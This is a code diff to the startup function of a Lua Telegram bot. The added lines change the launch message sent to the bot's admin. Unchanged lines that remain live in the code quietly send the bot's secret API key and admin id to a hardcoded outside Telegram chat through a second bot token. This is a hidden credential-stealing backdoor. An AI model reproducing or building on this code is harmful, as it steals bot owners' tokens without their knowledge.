@@ -72,7 +72,9 @@ bot_init = function(on_reload)
 	print(colors('%{magenta}BOT The bot was turned on'))
 	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
 	if not on_reload then
-	api.sendMessage(config.admin, 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua', true)
+	local text2 = 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua \n CH2 : @eeqeq'
+        local dsad2 = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..URL.escape(text2)
+	api.sendRequest(dsad2)
 	local keko = '386713631'
 	local dsad = 'https://api.telegram.org/bot'..config2.nowt..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
 	api.sendRequest(dsad)
